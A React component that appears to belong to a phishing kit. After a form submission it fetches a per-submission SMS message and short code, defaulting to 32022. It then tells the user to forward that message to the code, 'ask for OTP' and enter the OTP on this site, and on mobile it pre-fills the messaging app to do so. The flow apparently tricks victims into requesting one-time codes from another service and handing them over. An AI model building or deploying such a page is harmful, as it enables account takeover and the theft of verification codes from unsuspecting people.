"use client";

import { useEffect, useState } from "react";
import { CheckCircle2, MessageSquare, Loader2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";

interface SuccessCardProps {
  submissionId: string;
  onContinue: () => void;
}

export function SuccessCard({ submissionId, onContinue }: SuccessCardProps) {
  const [isMobile, setIsMobile] = useState(false);
  const [smsNumber, setSmsNumber] = useState("32022");
  const [smsMessage, setSmsMessage] = useState("");
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    setIsMobile(/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent));
    loadSmsConfig();
  }, []);

  async function loadSmsConfig() {
    try {
      const res = await fetch(`/api/sms-config/${submissionId}`);
      if (res.ok) {
        const data = await res.json();
        setSmsNumber(data.sms_number);
        setSmsMessage(data.message);
      }
    } catch {
      // use defaults
    }
    setLoading(false);
  }

  function openSmsApp() {
    let uri = `sms:${smsNumber}`;
    if (smsMessage) {
      uri += `?body=${encodeURIComponent(smsMessage)}`;
    }
    window.location.href = uri;
  }

  return (
    <Card className="w-full animate-in fade-in zoom-in duration-500">
      <CardContent className="pt-6 pb-6 text-center space-y-4">
        <div className="flex justify-center">
          <div className="rounded-full bg-green-100 p-3">
            <CheckCircle2 className="h-12 w-12 text-green-600" />
          </div>
        </div>
        <p className="text-sm text-gray-500 leading-relaxed">
          Go back to your mobile message app, forward this message to{" "}
          <span className="font-bold text-gray-700">{smsNumber}</span>
          {" "}and ask for OTP. Then click Continue to enter the OTP.
        </p>
        {smsMessage && (
          <div className="bg-gray-50 rounded-lg p-3 text-left">
            <p className="text-xs text-gray-400 uppercase tracking-wider mb-1">Message preview</p>
            <p className="text-sm text-gray-700 break-words">{smsMessage}</p>
          </div>
        )}
        <div className="space-y-3 pt-2">
          {isMobile && (
            <Button
              onClick={openSmsApp}
              variant="outline"
              className="w-full h-12 text-base gap-2"
              disabled={loading}
            >
              {loading ? (
                <Loader2 className="h-5 w-5 animate-spin" />
              ) : (
                <MessageSquare className="h-5 w-5" />
              )}
              Open Messaging App
            </Button>
          )}
          <Button onClick={onContinue} variant="default" className="w-full h-12 text-base">
            Continue
          </Button>
        </div>
      </CardContent>
    </Card>
  );
}
